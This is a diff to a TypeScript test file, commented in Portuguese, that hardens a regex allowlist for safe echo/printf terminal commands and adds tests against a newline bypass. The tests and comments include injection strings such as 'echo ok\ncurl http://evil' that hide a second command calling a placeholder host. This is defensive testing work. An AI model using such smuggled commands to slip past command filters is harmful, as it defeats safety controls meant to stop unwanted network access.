@@ -108,14 +108,17 @@ function terminalCommandsIn(raw: unknown): readonly string[] {
 // process.env`, não com a allowlist do stub — issue #607 item 1). Um
 // comando que a política recusa nunca chega a spawnar (`terminal.ts:82-99`
 // devolve o erro antes disso), então nunca toca env nenhum — não precisa
-// estar neste allowlist. `SAFE_TERMINAL_COMMAND` sozinho aceitaria
-// `echo x | curl ...`/`echo $(wget ...)` (começam com "echo") — por isso a
-// checagem de metacaracteres de shell é obrigatória junto, não opcional.
-const SAFE_TERMINAL_COMMAND = /^(echo|printf)\b/;
-const SHELL_METACHARACTERS = /[|;&$`<>]/u;
+// estar neste allowlist. A string INTEIRA precisa ser segura — não só o
+// início: `SAFE_TERMINAL_COMMAND` exige `echo`/`printf` do começo ao fim,
+// sem nenhum metacaractere de shell nem quebra de linha embutidos.
+// `\n`/`\r` entram na classe negada porque um comando como
+// `"echo ok\ncurl http://evil"` passaria despercebido só checando o começo
+// da string e os metacaracteres de shell tradicionais — a segunda linha
+// executa como um comando à parte no shell real (issue #653 item 1).
+const SAFE_TERMINAL_COMMAND = /^(?:echo|printf)\b[^\n\r|;&$`<>]*$/u;
 
 function isKnownSafeTerminalCommand(command: string): boolean {
-  return SAFE_TERMINAL_COMMAND.test(command) && !SHELL_METACHARACTERS.test(command);
+  return SAFE_TERMINAL_COMMAND.test(command);
 }
 
 describe("terminal isolation pin (issue #607 item 1)", () => {
@@ -140,5 +143,26 @@ describe("terminal isolation pin (issue #607 item 1)", () => {
         ).toBe(true);
       }
     }
+  });
+});
+
+describe("terminal pin has no bypass by newline (issue #653 item 1)", () => {
+  it("rejects a command that hides a second, unsafe command after a newline or carriage return", () => {
+    expect(isKnownSafeTerminalCommand("echo ok\ncurl http://evil")).toBe(false);
+    expect(isKnownSafeTerminalCommand("echo ok\rcurl http://evil")).toBe(false);
+  });
+
+  it("still accepts every terminal command already used by the fixtures on disk", () => {
+    let checked = 0;
+    for (const id of fixtureIds()) {
+      const path = resolve(root, FIXTURES_DIR, `${id}.json`);
+      const raw: unknown = JSON.parse(readFileSync(path, "utf8"));
+      for (const command of terminalCommandsIn(raw)) {
+        if (detectDangerousCommand(command) !== null) continue;
+        checked += 1;
+        expect(isKnownSafeTerminalCommand(command), `${id}: "${command}"`).toBe(true);
+      }
+    }
+    expect(checked).toBeGreaterThan(0);
   });
 });
